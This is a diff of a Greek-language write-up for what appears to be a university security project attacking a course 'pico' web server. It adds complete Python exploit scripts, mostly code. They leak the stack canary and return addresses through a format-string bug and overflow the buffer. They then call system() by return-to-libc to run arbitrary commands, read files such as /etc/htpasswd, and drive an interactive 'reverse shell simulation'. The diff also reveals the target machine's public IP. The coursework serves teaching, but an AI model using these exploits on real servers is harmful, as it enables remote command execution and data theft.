@@ -422,7 +422,7 @@
 <br/>
 
 9. Επειτα, υπολογίσαμε το offset της διεύθυνσης της εντολής που καλεί την **`serve_ultimate()`** από την πραγματική _return address_ της `check_auth()`, 
-   το οποίο είναι ίσο με: **0x145**. _(Παρακάτω παρατίθεται και ο σχετικός κώδικας που κάνει το attack)_
+   το οποίο είναι ίσο με: **0x145**. _(Παρακάτω παρατίθεται και ο σχετικός κώδικας που πραγματοποιεί το attack)_
    
    |![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/22-Check_Auth_Ret.png)|![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/23-Call_Serve_Ultimate.png)|
    |-|-|
@@ -465,13 +465,13 @@
       # Building the payload
       canary   = text_obj[-3]
       ebp      = text_obj[-2]
-      ret_addr = text_obj[-1]
+      auth_ret = text_obj[-1]
 
       offset_srv_ulti = 0x145
 
       canary   = struct.pack('<L', int(canary  , base=16))
       svd_ebp  = struct.pack('<L', int(ebp     , base=16))
-      srv_ulti = struct.pack('<L', int(ret_addr, base=16) + offset_srv_ulti)
+      srv_ulti = struct.pack('<L', int(auth_ret, base=16) + offset_srv_ulti)
 
       binary_payload = BytesIO()
       binary_payload.write(("p" * 100).encode("utf-8"))
@@ -557,15 +557,15 @@
        # Building the payload
        canary   = text_obj[-3]
        ebp      = text_obj[-2]
-       ret_addr = text_obj[-1]
+       auth_ret = text_obj[-1]
       
        offset_srv_ulti = 0x870
        offset_safe_ret = 0x169 
  
        canary   = struct.pack('<L', int(canary  , base=16))
        svd_ebp  = struct.pack('<L', int(ebp     , base=16))
-       srv_ulti = struct.pack('<L', int(ret_addr, base=16) + offset_srv_ulti)
-       safe_ret = struct.pack('<L', int(ret_addr, base=16) + offset_safe_ret)
+       srv_ulti = struct.pack('<L', int(auth_ret, base=16) + offset_srv_ulti)
+       safe_ret = struct.pack('<L', int(auth_ret, base=16) + offset_safe_ret)
  
        binary_payload = BytesIO()
        binary_payload.write(("p" * 100).encode("utf-8"))
@@ -621,7 +621,7 @@
    |-|-|
    |1η εντολή της `send_file()` | **0x656** |
    |Επιστροφή της `send_file()` σε safe address | **0x169**|
-   |Αρχή του πίνακα `post_data` σε σχέση με τον **ebp** της route | **0x110**|
+   |Αρχή του πίνακα `post_data` σε σχέση με τον **ebp** της post_param | **0x110**|
    
    ```python
    ...
@@ -659,15 +659,15 @@
       # Building the payload
       canary   = text_obj[-3]
       ebp      = text_obj[-2]
-      ret_addr = text_obj[-1]
+      auth_ret = text_obj[-1]
 
       offset_srv_ulti = 0x870
       offset_safe_ret = 0x169 
 
       canary   = struct.pack('<L', int(canary  , base=16))
       svd_ebp  = struct.pack('<L', int(ebp     , base=16))
-      srv_ulti = struct.pack('<L', int(ret_addr, base=16) + offset_srv_ulti)
-      safe_ret = struct.pack('<L', int(ret_addr, base=16) + offset_safe_ret)
+      srv_ulti = struct.pack('<L', int(auth_ret, base=16) + offset_srv_ulti)
+      safe_ret = struct.pack('<L', int(auth_ret, base=16) + offset_safe_ret)
 
       binary_payload = BytesIO()
       binary_payload.write(("p" * 100).encode("utf-8"))
@@ -728,7 +728,7 @@
    |1η εντολή της `serve_ultimate()` | **0x870** |
    |1η εντολή της `send_file()` | **0x656** |
    |Επιστροφή της `send_file()` σε safe address | **0x169**|
-   |Θέση του argument για τη `send_file()` σε σχέση με τον **ebp** της route | **0x8C**|
+   |Θέση του argument για τη `send_file()` σε σχέση με τον **ebp** της post_param | **0x8C**|
    
    ```python
    ...
@@ -778,10 +778,10 @@
 
       canary   = struct.pack('<L', int(canary  , base=16))
       svd_ebp  = struct.pack('<L', int(ebp     , base=16))
+      argument = struct.pack('<L', int(ebp     , base=16) - offset_to_pdata)
       fin_ret  = struct.pack('<L', int(auth_ret, base=16) + offset_to_fin_ret)
       sndf_ret = struct.pack('<L', int(auth_ret, base=16) + offset_to_send_fl)
       ulti_ret = struct.pack('<L', int(auth_ret, base=16) + offset_to_srv_ulti)
-      argument = struct.pack('<L', int(ebp     , base=16) - offset_to_pdata)
 
       binary_payload = BytesIO()
       binary_payload.write(("p" * 100).encode("utf-8"))
@@ -839,7 +839,7 @@
 
 7. Έμενε πλέον να βρούμε την Public IP του μηχανήματος στο οποίο τρέχει ο pico server.
    
-   Αρχικά, αναζητούσαμε επιθέσεις όπως **SSL Certificates Attack**. [<sup>\[17\]</sup>](#17--httpswwwnetsparkercomblogweb-securityexposing-public-ips-tor-services-through-ssl-certificates)[<sup>\[18\]</sup>](#18--httpswwwbleepingcomputercomnewssecuritypublic-ip-addresses-of-tor-sites-exposed-via-ssl-certificates) 
+   Αρχικά, αναζητούσαμε επιθέσεις όπως **SSL Certificates Attack**. [<sup>\[17\]</sup>](#17--httpswwwnetsparkercomblogweb-securityexposing-public-ips-tor-services-through-ssl-certificates)[<sup>\[18\]</sup>](#18--httpswwwbleepingcomputercomnewssecuritypublic-ip-addresses-of-tor-sites-exposed-via-ssl-certificates)
    Ωστόσο, σύντομα είδαμε ότι δεν θα αποδώσει ο τρόπος αυτός κάποιο αποτέλεσμα και ξαναγυρίσαμε στην ιδέα κάποιου πιο advanced **BOF**.
    
    Πρώτα, κάναμε retrieve πάρα πολλά αρχεία του συστήματος με το attack του προηγούμενου βήματος, όπως αρχεία του **`/proc/net/`** directory, μήπως και βρισκόταν
@@ -850,11 +850,710 @@
 <br/>
 
 8. Στη συνέχεια λοιπόν, σκεφτήκαμε να κάνουμε το **Return to Libc Attack**.
+
+   Δεδομένου ότι οι διευθύνσεις των βιβλιοθηκών βρίσκονται σε ξεχωριστό segment από αυτό του code segment, θα έπρεπε κάπως να βρούμε τουλάχιστον μια
+   διεύθυνση μέσα σε αυτό, ώστε να μπορέσουμε να υπολογίσουμε με offsets την κλήση που θέλουμε να κάνουμε.
    
+   Υπάρχει ένα αρχείο το οποίο περιέχει όλο το **memory mapping** του μηχανήματος, από το οποίο μπορούμε να πάρουμε τις διευθύνσεις στις οποίες βρίσκεται
+   το segment της libc.
+   
+   &emsp; ![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/32-Pico_Machine_Memory_Mapping.png)
+   
+   Ωστόσο, πριν το βρούμε αυτό, βρήκαμε τη διεύθυνση επιστροφής της `main()` που επιστρέφει σε αυτό το segment και μετά μέσω υπολογισμού των νέων offsets 
+   καταφέραμε να κάνουμε κλήση της **`system()`** με όρισμα που θα εκτελούσε την εντολή: **`curl ifconfig.me`**.
+  
+<br/>
+
+9. Έχοντας από το προηγούμενο part οτι η απόσταση του **ορίσματος** της `printf()` και του **ebp** της `check_auth()`, είναι ίση με **0x78 = 30\*4 = 120 bytes**, 
+   εύκολα υπολογίσαμε ότι έπρεπε να δώσουμε σαν payload: **%111$x**, για να πάρουμε το return address της **`main()`**, υπολογίζοντας απλά την απόσταση μεταξύ της
+   διεύθυνσης του **ebp της `main()`** και της διεύθυνσης του **ebp της `check_auth()`**, που είναι ίση με: **0x140 = 80\*4 = 320 bytes**. \
+   Άρα, έχουμε συνολικά: **(30 + 80 + 1)\*4 = 120 + 320 + 4 = 444 = _111_\*4**
+   > <h5>Σημείωση: Χρησιμοποιείται η διεύθυνση του κάθε ebp, γιατί η τιμή του είναι η διεύθυνση της καλούσας συνάρτησης</h5>
+   
+   |Description|Offset <br/> <sub>(from **check_auth** ret addr)</sub>|
+   |-|-|
+   |1η εντολή της `serve_ultimate()` | **0x870** |
+   |1η εντολή της `systen()` | **0x22769** |
+   |Επιστροφή της `system()` σε safe address | **0x169**|
+   |Θέση του command για τη `system()` σε σχέση με τον **ebp** της post_param | **0x8C**|
+   
+   ```python
+   ...
+   binary_payload = BytesIO()
+   binary_payload.write(("p" * 100).encode("utf-8"))
+   binary_payload.write(canary)
+   binary_payload.write(("p" * 8).encode("utf-8"))
+   binary_payload.write(svd_ebp)
+   binary_payload.write(ulti_ret)
+   binary_payload.write(sys_ret)
+   binary_payload.write(fin_ret)
+   binary_payload.write(argument)
+   binary_payload.write((argv[2] + "&").encode("utf-8"))
+   ...
+   ```
+   <details>
+   <summary><b>Click here to see the full script</b></summary>
+      <p>
+
+      ```python
+      import pycurl
+      import struct
+      import base64
+      import requests
+
+      from sys import argv
+      from io  import BytesIO
+
+      # Sending 1st payload to / for getting the canary value and
+      # the return address of check_auth() from reposnse headers
+      url = 'http://localhost:' + argv[1] + '/'
+
+      username_payload64 = base64.b64encode(bytes('%27$x %30$x %31$x %111$x', 'utf-8'))
+      input_headers = {'Authorization': 'Basic ' + username_payload64.decode('UTF-8')}
+      response = requests.request("GET", url, headers=input_headers)
+      text_obj = list(response.headers.items())[0][1].split('user: ')[-1].replace('"' , '').split()
+
+      # Building the payload
+      canary   = text_obj[-4]
+      ebp      = text_obj[-3]
+      auth_ret = text_obj[-2]
+      main_ret = text_obj[-1]
+
+      offset_to_srv_ulti = 0x870
+      offset_to_fin_ret  = 0x169
+      offset_to_arg      = 0x8C
+      offset_to_system   = 0x22769
+
+      canary   = struct.pack('<L', int(canary  , base=16))
+      svd_ebp  = struct.pack('<L', int(ebp     , base=16))
+      argument = struct.pack('<L', int(ebp     , base=16) - offset_to_arg)
+      fin_ret  = struct.pack('<L', int(auth_ret, base=16) + offset_to_fin_ret)
+      ulti_ret = struct.pack('<L', int(auth_ret, base=16) + offset_to_srv_ulti)
+      sys_ret  = struct.pack('<L', int(main_ret, base=16) + offset_to_system)
+
+      binary_payload = BytesIO()
+      binary_payload.write(("p" * 100).encode("utf-8"))
+      binary_payload.write(canary)
+      binary_payload.write(("p" * 8).encode("utf-8"))
+      binary_payload.write(svd_ebp)
+      binary_payload.write(ulti_ret)
+      binary_payload.write(sys_ret)
+      binary_payload.write(fin_ret)
+      binary_payload.write(argument)
+      binary_payload.write((argv[2] + "&").encode("utf-8"))
+
+      # Sending the final request that will do the Buffer Overflow and retrieve ultimate.html
+      url = 'http://localhost:' + argv[1] + '/ultimate.html'
+      authentication64 = base64.b64encode(bytes('admin:you shall not pass', 'utf-8'))
+      headers = {'Authorization': 'Basic ' + authentication64.decode('UTF-8')}
+      response = requests.request("POST", url, headers=headers, data=binary_payload.getvalue(), timeout=None)
+
+      # Uncomment for removing ultimate.html from output
+      print(response.text)
+      # print(response.text[173:])
+      
+      # ------------------------------------------------------
+      # Run: python3 bof.py <port> <command>
+      # eg.: python3 bof.py 8000 "curl ifconfig.me"
+      ```
+       
+      </p>
+   </details><br/>
+   
+   Έτσι, βρήκαμε τελικά την **Public IP** του μηχανήματος!
+   
+   &emsp; ![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/33-Public_IP.png)
+
+   Και τελικά έχουμε την απάντηση και του τελευταίου Part, την οποία σας δίνουμε με ένα χιουμοριστικό τρόπο:
+   
+   > Been a while since we started our journey through time. \
+   > We were wandering alone on every timeline.
+   >
+   > Trolling everyone in our tricky way \
+   > it was then, when we found it, at 11 of May.
+   >
+   > It was a furious battle, between man and machine, \
+   > the likes of which, the history had never seen.
+   >
+   > And once it made its final move, \
+   > c4 became Kasparov's doom.
+   >
+   > The die was casted, Deep Blue had won, \
+   > but still... its address remained unknown.
+   <br/>
+   
+   > The final clue was hidden well, \
+   > cleverly disguised but time would tell.
+   >
+   > The task was hard, we gave it all, \
+   > we found the guard, it's time to fall.
+   >
+   > Its 'system' was, its final flaw, \
+   > now Cybergh0sts can rule it all.
+   >
+   > Its address finally has been revealed (3.85.143.73), \
+   > and now nothing can be concealed.
+   <br/>
+   
+   > We now have the code to reach you in the past, \
+   > thank you for the journey we longed to have at last.
+   >
+   > We had a great experience, but now comes the time \
+   > to go back to the future, to our timeline.
+   <br/>
+   
+   > Oh, we almost forgot... \
+   > Before we depart and leave without \
+   > the code is <c4\><3.85.143.73\>
+   >
+   > Cybergh0sts out!
    
 
+## Improvements
+
+Μετά το τελευταίο attack μέσω του **ret2libc**, σκεφήκαμε και υλοποιήσαμε διάφορους τρόπους, ώστε να παρακάμψουμε ή να στείλουμε τα headers 
+που χρειάζονται με διαφορετικό τρόπο, χωρίς να στέλνεται και το ultimate.html μαζί.
+
+### Call `printf()`
+
+Το πρώτο που δοκιμάσαμε ήταν να κάνουμε εμείς κλήση της `printf()` δίνοντας της σαν όρισμα τα headers που θέλουμε.
+
+Αυτό ενέχει διάφορα προβλήματα, κυρίως λόγω του ότι έχουμε να χειριστούμε με την επιστροφή και τα ορίσματα **2** συναρτήσεων που και οι δύο 
+παίρνουν κάποιο όρισμα. Γενικά, πριν από κάθε κλήση συνάρτησης στο παρόν πρόγραμμα, ο **esp** αυξανόταν κατά **0x10 = 16 bytes** και μετά από 
+την επιστροφή της μειωνόταν κατά τό ίδιο ποσό. Έτσι, θα έπρεπε κάπως να "καταναλώνουμε" το όρισμα της `printf()` πρωτού επιστρέψουμε στην `system()`.
+
+Για να το πετύχουμε αυτό, αυξάναμε εικονικά τον esp κατά **0x10** _(συμπεριλαμβανομένου και του ορίσματος)_ και επιστρέφαμε σε ένα κομμάτι 
+κώδικα που έκανε την επαναφορά αυτών των **0x10 bytes**.
+
+Όμως, προέκυπταν άλλα θέματα με τις αλλαγές του **ebp**. Από το κομμάτι αυτό που έκανε την επαναφρορά του **esp** και κατανάλωνε τα **0x10 bytes**, 
+η κλήση επέστρεφε μέσα στη **`route()`**. 
+
+Έτσι, θα έπρεπε να πειράξουμε το return address της `route()` ώστε όταν επιστρέψει να καλέστει η **`system()`** και μετά από εκεί να γίνει ομαλός 
+τερματισμός της εκτέλεσης.
+
+Τελικά καταφέραμε να πραγματοποιήσουμε αυτό το attack και να παρακάμψουμε την αποστολή του _ultimate.html_.
+
+Παρακάτω παρατίθεται και ο σχετικός κώδικας.
+
+|Description|Offset <br/> <sub>(from **check_auth** ret addr)</sub>|
+|-|-|
+|1η εντολή της `send_file()` | **0x870** |
+|Επιστροφή της `send_file()` σε safe address | **0xF4E**|
+|1η εντολή της `printf()` | **0x31039** |
+|Επιστροφή της `printf()` σε safe address | **0x169**|
+|Θέση των headers για την `printf()` σε σχέση με τον **ebp** της post_param | **0x90**|
+|Θέση του argument για τη `send_file()` σε σχέση με τον **ebp** της post_param | **0x7C**|
+
+```python
+...
+binary_payload = BytesIO()
+binary_payload.write(("p" * 100).encode("utf-8"))
+binary_payload.write(canary)
+binary_payload.write(("p" * 4).encode("utf-8"))
+binary_payload.write(svd_ebx)
+binary_payload.write(svd_ebp)
+binary_payload.write(prtf_ret)
+binary_payload.write(safe_ret)
+binary_payload.write(prtf_arg)
+binary_payload.write(("HTTP/1.1 200 OK\r\n\r\n&").encode("utf-8"))
+binary_payload.write((argv[2] + "&").encode("utf-8"))
+binary_payload.write(("p" * (108 - len(argv[2]) + 3)).encode("utf-8"))
+binary_payload.write(canary)
+binary_payload.write(("p" * 4).encode("utf-8"))
+binary_payload.write(svd_rt_ebx)
+binary_payload.write(svd_rt_ebp)
+binary_payload.write(sndf_ret)
+binary_payload.write(fin_ret)
+binary_payload.write(argument)
+...
+```
+<details>
+<summary><b>Click here to see the full script</b></summary>
+   <p>
+
+   ```python
+   import sys
+   import pycurl
+   import struct
+   import base64
+   import requests
+
+   from sys import argv
+   from io  import BytesIO
+
+
+   url = 'http://localhost:' + argv[1] + '/'
+
+   header_data_b64 = base64.b64encode(bytes('%27$x %29$x %30$x %31$x %69$x %70$x %111$x', 'utf-8'))
+   headers = {'Authorization': 'Basic ' + header_data_b64.decode('UTF-8')}
+   response = requests.request("GET", url, headers=headers)
+   resp_data = list(response.headers.items())[0][1].split('user: ')[-1].replace('"' , '').split()
+
+   # Building the payload
+   canary       = resp_data[-7]
+   ebx          = resp_data[-6]
+   ebp          = resp_data[-5]
+   auth_ret     = resp_data[-4]
+   route_ebx    = resp_data[-3] 
+   route_ebp    = resp_data[-2] 
+   main_ret     = resp_data[-1]
+
+   offset_to_send_fl  = 0x656
+   offset_to_fin_ret  = 0xF4E
+   offset_to_printf   = 0x31039
+   offset_to_safe_ret = 0x169
+   offset_to_headers  = 0x90
+   offset_to_path     = 0x7C
+
+   canary     = struct.pack('<L', int(canary   , base=16))
+   svd_ebx    = struct.pack('<L', int(ebx      , base=16))
+   svd_ebp    = struct.pack('<L', int(ebp      , base=16))
+   svd_rt_ebx = struct.pack('<L', int(route_ebx, base=16))
+   svd_rt_ebp = struct.pack('<L', int(route_ebp, base=16))
+   prtf_arg   = struct.pack('<L', int(ebp      , base=16) - offset_to_headers)
+   argument   = struct.pack('<L', int(ebp      , base=16) - offset_to_path)
+   prtf_ret   = struct.pack('<L', int(main_ret , base=16) + offset_to_printf)
+   fin_ret    = struct.pack('<L', int(auth_ret , base=16) + offset_to_fin_ret)
+   sndf_ret   = struct.pack('<L', int(auth_ret , base=16) + offset_to_send_fl)
+   safe_ret   = struct.pack('<L', int(auth_ret , base=16) + offset_to_safe_ret)
+
+   binary_payload = BytesIO()
+   binary_payload.write(("p" * 100).encode("utf-8"))
+   binary_payload.write(canary)
+   binary_payload.write(("p" * 4).encode("utf-8"))
+   binary_payload.write(svd_ebx)
+   binary_payload.write(svd_ebp)
+   binary_payload.write(prtf_ret)
+   binary_payload.write(safe_ret)
+   binary_payload.write(prtf_arg)
+   binary_payload.write(("HTTP/1.1 200 OK\r\n\r\n&").encode("utf-8"))
+   binary_payload.write((argv[2] + "&").encode("utf-8"))
+   binary_payload.write(("p" * (108 - len(argv[2]) + 3)).encode("utf-8"))
+   binary_payload.write(canary)
+   binary_payload.write(("p" * 4).encode("utf-8"))
+   binary_payload.write(svd_rt_ebx)
+   binary_payload.write(svd_rt_ebp)
+   binary_payload.write(sndf_ret)
+   binary_payload.write(fin_ret)
+   binary_payload.write(argument)
+
+   url = 'http://localhost:' + argv[1] + '/ultimate.html'
+   header_data_b64 = base64.b64encode(bytes('admin:you shall not pass', 'utf-8'))
+   headers = {'Authorization': 'Basic ' + header_data_b64.decode('UTF-8')}
+   response = requests.request("POST", url, headers=headers, data=binary_payload.getvalue(), timeout=None)
+
+   print(response.text)
+
+   # ------------------------------------------------------
+   # Run: python3 bof.py <port> <file_to_retrieve>
+   # eg.: python3 bof.py 8000 /etc/htpasswd
+   ```
+
+   </p>
+</details><br/>
+
+---
+
+### Multiple Command Execution - Reverse Shell Simulation
+
+Τέλος, αυτό που τελικά κρατήσαμε και αναπτύξαμε ήταν να εκτελέσουμε πολλαπλές εντολές μέσω της `system()`, ξεκινώντας με ένα απλό **`echo 'HTTP/1.1 200 OK\n'`**.
+Ετσι, πετυχαίναμε να στείλουμε πρώτα τα headers με έναν εξαιρετικά απλό τρόπο και στη συνέχεια να εκτελούμε οποιαδήποτε εντολή θέλαμε μέσω αυτής. [<sup>\[19\]</sup>](#19--httpsbloglamarranetcomindexphpexploit-education-phoenix-heap-two-solution)[<sup>\[20\]</sup>](#20--httpsqiitacomv_avengeritems8afcf758990c9ab03ad7)
+
+Πραγματοποιήσαμε και μια σειρά από βελτιστοποιήσεις, έτσι ώστε να ελαχιστοποιήσουμε τον χώρο που καταλαμβάνεται από το payload και να μεγιστοποιήσουμε το
+ανώτατο δυνατό μέγεθος για κάποιο command που θα θέλαμε να εκτελέσουμε. Έτσι, καταφέραμε να φτάσουμε το ανώτατο μέγεθος ενός request στα **460 bytes**.
+Μπορούν δηλαδή να ζητηθούν requests μέχρι και **460** χαρακτήρων και να εκτελεστούν κανονικά. 
+
+Επίσης, έχουμε αυτοματοποιήσει πλήρως όλες τις διαδικασίες και έχουμε φτιάξει μια προσομοίωση ενός **Reverse Shell**, ώστε να είναι ακόμα πιο εύκολος ο χειρισμός
+του script και του attack γενικότερα.
+
+Έχουμε φτιάξει ένα εικονικό περιβάλλον σαν terminal στο οποίο μπορεί ο χρήστης να εισάγει κάποια εντολή η οποία θα επιστρέψει το αποτέλεσμα άμεσα, πραγματοποιώντας 
+στο background όλες τις διαδικασίες του attack.
+
+Το script παρέχει και πολλές παραμέτρους τροποποίησης ακόμα. Παρακάτω παρατίθεται ένας πίνακας με τα flags και τις περιγραφές τους.
+
+|Flags|Description|Values|Default Value|
+|-|-|-|-|
+|-p|Change authentication **password**|_User\_defined_|you shall not pass|
+|-t|Change **timeout** limit of the request|None, integer|5|
+|-d|Disables **information messages**|N/A|Enabled|
+|-s|Enables **ret2libc** attack|N/A|Disabled|
+|-xd|Exports **results** into specified file|string|N/A|
+|-xp|Exports **payload** into specified file|string|N/A|
+|-rs|Enables **Reverse Shell Simulation**|N/A|Disabled|
+
+<details>
+<summary><b>Click here to see the full script</b></summary>
+   <p>
+
+   ```python
+   import sys
+   import pycurl
+   import struct
+   import base64
+   import requests
+
+   from sys import argv
+   from io  import BytesIO
+
+   colors = {'Red'          : '\033[31m'      ,
+             'Green'        : '\033[32m'      ,
+             'Yellow'       : '\033[33m'      ,
+             'Blue'         : '\033[34m'      ,
+             'Purple'       : '\033[35m'      ,
+
+             'Light_Red'    : '\033[91m'      ,
+             'Light_Green'  : '\033[92m'      ,
+             'Light_Yellow' : '\033[93m'      ,
+             'Light_Blue'   : '\033[94m'      ,
+             'Light_Purple' : '\033[95m'      ,
+
+             'Bright_Red'   : '\033[1;31m'    ,
+             'Bright_Green' : '\033[1;32m'    ,
+             'Bright_Yellow': '\033[1;33m'    ,
+             'Bright_Blue'  : '\033[1;34m'    ,
+             'Bright_Purple': '\033[1;35m'    ,
+
+             'BLight_Red'   : '\033[1;91m'    ,
+             'BLight_Green' : '\033[1;92m'    ,
+             'BLight_Yellow': '\033[1;93m'    ,
+             'BLight_Blue'  : '\033[1;94m'    ,
+             'BLight_Purple': '\033[1;95m'    ,
+
+             'White'        : '\033[1;37m'    ,
+             'Orange'       : '\033[38;5;214m',
+             'Reset'        : '\033[0m'}
+
+   # ---------------------------------------------------------------------------------------------------- #
+
+   def send_headers_request(port, path, header_data, messages=1):
+
+       url = 'http://localhost:' + port + path
+
+       if messages:
+           print("\nConnecting to {}{}{}...".format(colors["Light_Green"], url, colors["Reset"]))
+
+       header_data_b64 = base64.b64encode(bytes(header_data, 'utf-8'))
+       headers = {'Authorization': 'Basic ' + header_data_b64.decode('UTF-8')}
+
+       if messages:
+           print("\nSending request with payload: {}{}{}".format(colors["Bright_Blue"], header_data, colors["Reset"]))
+
+       response = requests.request("GET", url, headers=headers)
+
+       return response
+
+   # ---------------------------------------------------------------------------------------------------- #
+
+   def send_http_request(port, path, header_data, payload, ret2libc=0, timeout=7, messages=1):
+
+       url = 'http://localhost:' + port + path
+
+       if messages:
+           print("\nConnecting to {}{}{}...".format(colors["Light_Green"], url, colors["Reset"]))
+
+       header_data_b64 = base64.b64encode(bytes('admin:' + header_data, 'utf-8'))
+       headers = {'Authorization': 'Basic ' + header_data_b64.decode('UTF-8')}
+
+       try:
+           if messages:
+               print("\nSending request...")
+
+           response = requests.request("POST", url, headers=headers, data=payload.getvalue(), timeout=timeout)
+
+           if messages:
+               if ret2libc:
+                   print("Executing command... ")
+               else:
+                   print("Retrieving Data... ")
+       except: 
+           if ret2libc:
+               print("Command execution failed")
+           else:
+               print("File not found")
+           return None
+
+       return response
+
+   # ---------------------------------------------------------------------------------------------------- #
+
+   def build_payload(resp_data, path, ret2libc=0, export_path=None, messages=1):
+
+       # Building the payload
+       canary   = resp_data[-5]
+       ebx      = resp_data[-4]
+       ebp      = resp_data[-3]
+       auth_ret = resp_data[-2]
+       main_ret = resp_data[-1]
+
+       if messages:
+           print("\nResponse: ")
+           print("  -> Canary                = {}{}{}    ".format(colors["Bright_Yellow"]                   , canary   , colors["Reset"]), sep='')
+           print("  -> EBX      (check_auth) = {}0x{}{}{}".format(colors["Light_Blue"], colors["Orange"]    , ebx      , colors["Reset"]), sep='')
+           print("  -> EBP      (check_auth) = {}0x{}{}{}".format(colors["Light_Blue"], colors["Bright_Red"], ebp      , colors["Reset"]), sep='')
+           print("  -> Ret_Addr (check_auth) = {0}0x{1}{2}{3}  <{4}route{3}+{5}114{3}>".format(colors["Light_Blue"] , colors["Orange"], auth_ret, colors["Reset"], colors["Bright_Yellow"], colors["White"]), sep='')
+           print("  -> Ret_Addr (main)       = {0}0x{1}{2}{3}  <{4}__libc_start_main{3}+{5}247{3}>".format(colors["Light_Blue"], colors["Bright_Purple"], main_ret, colors["Reset"], colors["Bright_Yellow"], colors["White"]), sep='')
+
+           print("\nCalculating new attack addresses... ", end='')
+
+       offset_to_fin_ret = 0xF4E
+       offset_to_system  = 0x22769
+       offset_to_path    = 0x90
+
+       canary   = struct.pack('<L', int(canary  , base=16))
+
+       svd_ebx  = struct.pack('<L', int(ebx     , base=16))
+       svd_ebp  = struct.pack('<L', int(ebp     , base=16))
+       argument = struct.pack('<L', int(ebp     , base=16) - offset_to_path)
+
+       sys_ret  = struct.pack('<L', int(main_ret, base=16) + offset_to_system)
+       fin_ret  = struct.pack('<L', int(auth_ret, base=16) + offset_to_fin_ret)
+
+       if messages:
+           print("Done\n")
+           print("Ret to {0}system{1}    = {2}0x{4}{3}{1}  <{5}system{1}>".format(colors["Bright_Green"], colors["Reset"], colors["Light_Blue"], hex(int(main_ret, base=16) + offset_to_system)[2:] , colors["Bright_Purple"], colors["Bright_Yellow"]), sep='')
+           print("Ret to {0}route{1}     = {2}0x{4}{3}{1}  <{5}respond{1}+{6}793{1}>".format(colors["Bright_Green"], colors["Reset"], colors["Light_Blue"], hex(int(auth_ret, base=16) + offset_to_fin_ret)[2:] , colors["Orange"], colors["Bright_Yellow"], colors["White"]), sep='')
+           print("Argument address = {}0x{}{}{}".format(colors["Light_Blue"], colors["Bright_Red"], hex(int(ebp, base=16) - offset_to_path)[2:], colors["Reset"]) , sep='')
+           print("Given argument   = {}{}{}".format(colors["Orange"], path, colors["Reset"]), sep='')
+
+       if messages:
+           print("\nGenerating payload... ", end='')
+
+       binary_payload = BytesIO()
+
+       binary_payload.write(("p" * 100).encode("utf-8"))
+       binary_payload.write(canary)
+       binary_payload.write(("p" * 4).encode("utf-8"))
+       binary_payload.write(svd_ebx)
+       binary_payload.write(svd_ebp)
+       binary_payload.write(sys_ret)
+       binary_payload.write(fin_ret)
+       binary_payload.write(argument)
+       binary_payload.write(("echo 'HTTP/1.1 200 OK\n';").encode("utf-8"))
+       if ret2libc:
+           binary_payload.write(("{}&".format(path)).encode("utf-8"))
+       else:
+           binary_payload.write(("cat {}&".format(path)).encode("utf-8"))
+
+       if messages:
+           print("Done")
+
+       if export_path != None:
+           if messages:
+               print("Exporting payload in {}{}{}...".format(colors["Light_Green"], export_path, colors["Reset"]), end='', sep='')
+
+           try:
+               xp = open(export_path, 'wb')
+           except:
+               print("{}Error:{} Cannot open file {}{}{}".format(colors["Bright_Red"], colors["Reset"], colors["Light_Green"], export_path, colors["Reset"]))
+               exit()
+
+           xp.write(binary_payload.getvalue())
+           xp.close()
+
+           if messages:
+               print("Done")
+
+       null_free_payload = BytesIO()
+       bp_val = binary_payload.getvalue()
+       anchor = 0
+       for i, byte in enumerate(binary_payload.getvalue()):
+           if not byte:
+               null_free_payload.write(bp_val[anchor:i])
+               null_free_payload.write(("=").encode("utf-8"))
+               anchor = i + 1
+
+       null_free_payload.write(bp_val[anchor:])
+       return null_free_payload
+
+   # ---------------------------------------------------------------------------------------------------- #
+
+   def perform_attack(port, password, path, ret2libc=0, export_results=None, export_payload=None, timeout=7, messages=1):
+
+       header_payload = '%27$x %29$x %30$x %31$x %111$x'
+
+       response  = send_headers_request(port, '/', header_payload, messages=messages)
+       resp_data = list(response.headers.items())[0][1].split('user: ')[-1].replace('"' , '').split()
+
+       binary_payload = build_payload(resp_data, path, ret2libc, export_payload, messages)
+
+       response = send_http_request(port, '/ultimate.html', password, binary_payload, ret2libc, timeout, messages)
+
+       if response is None:
+           exit()
+
+       if response.status_code != 200:
+           print("\n{}Error:{} Status {}{}{}\n".format(colors["Bright_Red"], colors["Reset"], colors["Light_Green"], response.status_code, colors["Reset"]), sep='')
+           exit()
+
+       if messages:
+           print("\nCompleted {}Successfully{}".format(colors["Light_Green"], colors["Reset"]))
+
+       if export_results != None:
+           try:
+               fp = open(export_results, 'wb')
+           except:
+               print("{}Error:{} Cannot open file {}{}{}".format(colors["Bright_Red"], colors["Reset"], colors["Light_Green"], export_results, colors["Reset"]))
+               exit()
+
+           if messages:
+               print("\nExporting received data in {}{}{}...".format(colors["Orange"], export_results, colors["Reset"]), end='', sep='')
+
+           fp.write(response.content)
+           fp.close()
+
+           print("Done\n")
+       else:
+           if messages:
+               print("--------------------------------------------------\n")
+
+           print(response.text)
+
+   # ---------------------------------------------------------------------------------------------------- #
+
+   def rev_shell(port, password, timeout=7):
+
+       while True:
+
+           try:
+               command = input(">> ")
+           except:
+               print()
+               exit()
+
+           export_path = None
+
+           if ">" in command:
+               parse_cmd   = command.replace(' ' , '').split('>')
+               command     = parse_cmd[0]
+               export_path = parse_cmd[1]
+
+           elif command == "exit":
+               return
+
+           elif command in ["clear", "cl"]:
+               print("\033[2J\033[1;1H")
+               continue
+
+           elif not command:
+               continue
+
+           elif "t=" in command.replace(' ', ''):
+               tval = command.replace(' ', '').split('t=')[1]
+
+               if tval.lower() != 'none':
+                   timeout = float(tval)
+                   print("Timeout set to: ", timeout)
+
+                   if timeout < 0:
+                       timeout = 5
+               else:
+                   print("Timeout set to: None")
+                   tval = None
+
+               continue
+
+           header_payload = '%27$x %29$x %30$x %31$x %111$x'
+
+           response  = send_headers_request(port, '/', header_payload, messages=0)
+           resp_data = list(response.headers.items())[0][1].split('user: ')[-1].replace('"' , '').split()
+
+           binary_payload = build_payload(resp_data, command, ret2libc=1, messages=0)
+
+           response = send_http_request(port, '/ultimate.html', password, binary_payload, ret2libc=1, timeout=timeout, messages=0)
+
+           if response is None:
+               continue
+
+           if export_path != None:
+
+               try:
+                   fp = open(export_path, 'wb')
+               except:
